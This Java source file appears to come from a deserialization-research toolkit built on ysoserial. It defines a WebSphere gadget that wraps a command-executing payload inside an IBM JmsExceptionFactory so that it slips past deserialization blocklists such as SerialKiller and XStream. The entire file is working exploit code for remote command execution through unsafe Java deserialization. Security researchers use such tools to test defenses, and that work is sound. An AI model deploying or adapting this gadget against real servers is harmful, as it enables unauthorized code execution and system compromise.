package serialkiller.bypass;

import com.ibm.msg.client.jms.JmsExceptionFactory;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Reflections;
import java.io.*;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "websphere"} )
public class WebSphere3 implements BypassGadget {

    public Object wrapPayload(String command, Class payload_class) throws Exception {

        Object payload = ((ObjectPayload) payload_class.getConstructor().newInstance()).getObject(command);

        JmsExceptionFactory jmsExceptionFactory = new JmsExceptionFactory(new javax.jms.JMSException(""));

        StringBuffer data = new StringBuffer();
        data.append("!V" + 0);
        data.append("!JMS_EXCEPTION");
        data.append("!FAKE");
        data.append("!666");
        data.append("!KABOOM");
        StringBuffer serializedStackTrace = new StringBuffer();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bos);
        out.writeObject(payload);
        out.close();
        byte[] buf = bos.toByteArray();
        bos.close();
        for (int j = 0; j < buf.length; j++) {
            serializedStackTrace.append(Byte.toString(buf[j]));
            serializedStackTrace.append(",");
        }
        data.append("!" + serializedStackTrace);
        String collapsedPayload = data.toString();
        Reflections.setFieldValue(jmsExceptionFactory, "exceptionData", collapsedPayload);

        return jmsExceptionFactory;
    }

    public boolean bypassXStream() { return true; }
    public boolean skipTest() { return false; }
}
